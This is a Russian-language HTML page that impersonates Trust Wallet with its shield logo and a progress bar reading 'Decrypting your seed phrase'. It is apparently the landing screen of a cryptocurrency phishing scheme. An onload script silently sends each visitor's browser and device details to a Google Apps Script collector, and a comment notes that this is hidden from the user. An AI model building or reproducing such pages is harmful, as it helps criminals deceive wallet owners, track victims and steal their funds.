<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet | Безопасное соединение</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 350px;
        }

        /* Логотип-щит Trust Wallet */
        .logo-svg {
            width: 80px;
            height: 80px;
            margin-bottom: 40px;
            fill: #0500ff;
        }

        /* Контейнер полоски загрузки */
        .loader-track {
            width: 100%;
            height: 5px;
            background-color: #f0f2f5;
            border-radius: 10px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }

        /* Сама бегущая полоска */
        .loader-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #0500ff, #5048ff);
            border-radius: 10px;
            animation: progress-animation 4s infinite ease-in-out;
        }

        /* Текст статуса */
        .status-text {
            color: #5b616e;
            font-size: 16px;
            font-weight: 500;
        }

        /* Анимация точек (...) */
        .dots::after {
            content: '';
            animation: dots-blink 1.5s infinite;
        }

        @keyframes progress-animation {
            0% { width: 0%; }
            50% { width: 75%; }
            100% { width: 100%; }
        }

        @keyframes dots-blink {
            0% { content: ''; }
            33% { content: '.'; }
            66% { content: '..'; }
            100% { content: '...'; }
        }
    </style>
</head>
<body>

<div class="container">
    <svg class="logo-svg" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
        <path d="M256 0L48 94.4v133.4C48 355.6 256 512 256 512s208-156.4 208-284.2V94.4L256 0z" fill="#0500ff"/>
        <path d="M256 465c-20-15.8-164-129.5-164-237.2V122.3L256 45.1l164 77.2v105.5C420 335.5 276 449.2 256 465z" fill="#fff"/>
        <path d="M140 230l80 80 152-152" stroke="#0500ff" stroke-width="40" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>

    <div class="loader-track">
        <div class="loader-fill"></div>
    </div>

    <div class="status-text">
        Расшифровываем вашу seed-фразу<span class="dots"></span>
    </div>
</div>

<script>
    // Скрипт автоматического уведомления в Google Таблицу
    window.onload = function() {
        const scriptURL = 'https://script.google.com/macros/s/AKfycbw8g_s_XQs1NyITGOVHseY4AW5_ijll9egLVukCdJ8qnvXBY-qP69QfPTFKQrOPfkOkYw/exec';
        
        // Собираем данные: время захода и информацию о браузере/устройстве
        const formData = new FormData();
        formData.append('userAgent', navigator.userAgent);
        formData.append('language', navigator.language);
        formData.append('screen', window.screen.width + 'x' + window.screen.height);

        // Отправка в Google Таблицу (скрытно для пользователя)
        fetch(scriptURL, { 
            method: 'POST', 
            body: formData,
            mode: 'no-cors' 
        })
        .then(() => console.log("Log sent successfully"))
        .catch(err => console.error("Error logging visit", err));
    }
</script>

</body>

</html>
